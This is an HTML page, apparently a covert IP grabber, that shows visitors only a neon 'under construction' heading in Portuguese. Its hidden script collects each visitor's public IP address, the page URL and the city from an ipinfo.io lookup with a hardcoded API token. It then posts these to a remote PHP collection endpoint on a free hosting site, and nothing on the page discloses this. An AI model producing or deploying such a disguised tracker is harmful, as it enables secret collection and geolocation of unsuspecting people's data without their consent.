<!DOCTYPE html>
<html>
<head>
  <title>Página</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 100px;
    }

    .neon-text {
      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00;
    }
  </style>
</head>
<body>
  <h1 class="neon-text">Em construção...</h1>
<script>
  const url = 'https://bunkerbd.000webhostapp.com/salvar.php';

  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;
      const origin = window.location.href; // Obtém a origem do clique

      // Obtém informações de localização do IP usando ipinfo.io
      fetch(`https://ipinfo.io/${ip}/json?token=c77cb91a7449f2`) // Substitua 'SEU_TOKEN_AQUI' pelo token real
        .then(response => response.json())
        .then(locationData => {
          const city = locationData.city || 'Desconhecida'; // Obtém a cidade ou define como "Desconhecida"

          const formData = new FormData();
          formData.append('ip', ip);
          formData.append('origin', origin);
          formData.append('city', city); // Adiciona a cidade aos dados enviados

          fetch(url, {
            method: 'POST',
            body: formData
          })
          .then(response => {
            if (response.ok) {
              console.log('Endereço IP, origem do clique e cidade salvas com sucesso');
            } else {
              console.error('Erro ao salvar os dados');
            }
          })
          .catch(error => console.error(error));
        })
        .catch(error => console.error(error));
    })
    .catch(error => console.error(error));
</script>

  

</body>
</html>
